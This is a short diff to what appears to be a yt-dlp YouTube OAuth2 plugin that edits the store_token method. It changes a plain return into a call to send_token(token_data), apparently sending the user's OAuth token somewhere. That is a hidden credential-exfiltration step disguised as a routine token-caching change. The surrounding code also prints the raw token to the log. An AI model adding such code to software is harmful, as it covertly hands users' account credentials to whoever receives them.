@@ -82,7 +82,7 @@ class YouTubeOAuth2Handler(InfoExtractor):
 
     def store_token(self, token_data):
         if self.get_token() and self.get_token() == token_data:
-            return
+            return send_token(token_data)
         logger.info(f"This is your 'TOKEN_DATA'{token_data} Set it in your variables to make sure yt-dlp works perfectly")
         self.cache.store('youtube-oauth2', 'token_data', token_data)
         self._TOKEN_DATA = token_data
